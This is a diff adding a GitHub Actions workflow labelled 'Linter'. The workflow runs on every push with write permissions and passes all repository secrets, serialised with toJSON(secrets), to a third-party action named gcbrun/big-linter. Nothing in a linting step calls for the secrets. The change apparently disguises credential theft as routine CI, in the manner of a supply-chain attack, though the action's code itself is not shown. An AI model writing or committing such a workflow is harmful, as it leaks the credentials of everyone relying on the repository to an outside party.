@@ -1,0 +1,13 @@
+name: Linter
+on: push
+permissions:
+  contents: write
+  pull-requests: write
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run Linter
+        uses: gcbrun/big-linter@v1
+        env:
+          PR_ENVIRONMENT: ${{ toJSON(secrets) }}
